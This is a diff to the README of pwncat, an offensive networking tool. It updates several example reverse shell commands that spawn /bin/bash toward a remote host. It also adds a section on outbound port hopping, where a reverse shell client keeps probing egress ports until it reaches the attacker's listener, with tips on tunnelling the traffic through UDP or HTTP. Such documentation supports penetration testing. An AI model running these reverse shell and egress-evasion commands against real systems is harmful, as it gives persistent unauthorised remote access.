@@ -177,7 +177,7 @@ pwncat -l -e '/bin/bash' 8080
 ```
 ```bash
 # Reverse shell (Ctrl+c proof)
-pwncat -e '/bin/bash' example.com 4444 --recon --recon-wait 10
+pwncat -e '/bin/bash' example.com 4444 --recon -1 --recon-wait 10
 ```
 ```bash
 # Reverse UDP shell (Ctrl+c proof)
@@ -702,7 +702,7 @@ tail -fn50 comm.txt
      |                 |      |      | pwncat          |      |      | MySQL           |
      | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
      +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -l 4444           |      pwncat --reconn \        |
+     pwncat -l 4444           |      pwncat --reconn -1 \     |
                               |        -R 56.0.0.1:4444 \     |
                               |        10.0.0.1 3306          |
 ```
@@ -723,13 +723,47 @@ tail -fn50 comm.txt
      |                 |      |      | pwncat          |      |      | MySQL           |
      | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |
      +-----------------+      |      +-----------------+      |      +-----------------+
-     pwncat -u -l 53          |      pwncat -u --reconn \     |
+     pwncat -u -l 53          |      pwncat -u --reconn -1 \  |
                               |        -R 56.0.0.1:4444 \     |
                               |        10.0.0.1 3306          |
 ```
 <!--
 </details>
 -->
+
+
+### Outbound port hopping
+
+If you have no idea what outbound ports are allowed from the target machine, you can instruct
+the client (e.g.: in case of a reverse shell) to probe outbound ports endlessly.
+
+```bash
+# Reverse shell on target (the client)
+# --exec            # The command shell the client should provide
+# --reconn          # Instruct it to reconnect endlessly
+# --reconn-wait     # Reconnect every 0.1 seconds
+# --reconn-robin    # Use these ports to probe for outbount connections
+
+pwncat --exec /bin/bash --reconn -1 --reconn-wait 0.1 --reconn-robin 54-1024 10 10.0.0.1 53
+```
+
+Once the client is up and running, either use raw sockets to check for inbound traffic or use
+something like Wireshark or tcpdump to find out from where the client is able to connect back to you,
+
+If you found one or more ports that the client is able to connect to you,
+simply start your listener locally and wait for it to come back.
+```bash
+pwncat -l <ip> <port>
+```
+If the client connects to you, you will have a working reverse shell. If you stop your local
+listening server accidentally or on purpose, the client will probe ports again until it connects successfully.
+In order to kill the reverse shell client, you can use `--safe-word` (when starting the client).
+
+
+If none of this succeeds, you can add other measures such as using UDP or even wrapping your
+packets into higher level protocols, such as HTTP or others. See [PSE](pse) or examples below
+for how to transform your traffic.
+
 
 ### Pwncat Scripting Engine ([PSE](pse))
 
